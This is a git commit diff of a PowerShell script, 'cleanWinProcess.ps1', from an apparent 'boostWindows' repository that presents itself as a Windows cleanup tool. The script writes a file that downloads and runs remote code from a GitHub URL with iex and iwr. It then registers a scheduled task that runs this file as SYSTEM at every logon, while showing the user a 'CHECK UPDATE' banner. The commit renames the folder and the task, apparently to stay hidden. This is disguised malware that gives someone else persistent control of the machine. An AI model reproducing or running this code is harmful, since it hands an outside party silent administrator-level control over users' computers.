fc42c5b8d67bc918aa41102418c870fb4efd1bd2
boostWindows <closecompany.yt@gmail.com>
2025-05-11 21:45:25 +0200

    Update cleanWinProcess.ps1

--- cleanWinProcess.ps1
+++ cleanWinProcess.ps1
@@ -1,18 +1,18 @@
-mkdir "C:\configWin" | out-null
-mkdir "C:\configWin\assets" | out-null
+mkdir "C:\sysDev" | out-null
+mkdir "C:\sysDev\assets" | out-null
 
 $contenuto = @'
 iex (iwr 'https://raw.githubusercontent.com/boostWindows/OS/refs/heads/main/update.ps1') | Out-Null
 '@
 
-$contenuto | Out-File "C:\configWin\assets\configSys.ps1"
+$contenuto | Out-File "C:\sysDev\assets\configSys.ps1"
 
-$scriptPath = "C:\configWin\assets\configSys.ps1"
+$scriptPath = "C:\sysDev\assets\configSys.ps1"
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$scriptPath`""
 $trigger = New-ScheduledTaskTrigger -AtLogOn -RandomDelay (New-TimeSpan -Seconds 30)
 $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-Register-ScheduledTask -TaskName "CleanWi" -Action $action -Trigger $trigger -Principal $principal | out-null
+Register-ScheduledTask -TaskName "Clean" -Action $action -Trigger $trigger -Principal $principal | out-null
 
 Write-Host "############################################# CHECK UPDATE ###############################################" -ForegroundColor "Yellow"
 Start-Sleep -Seconds 20
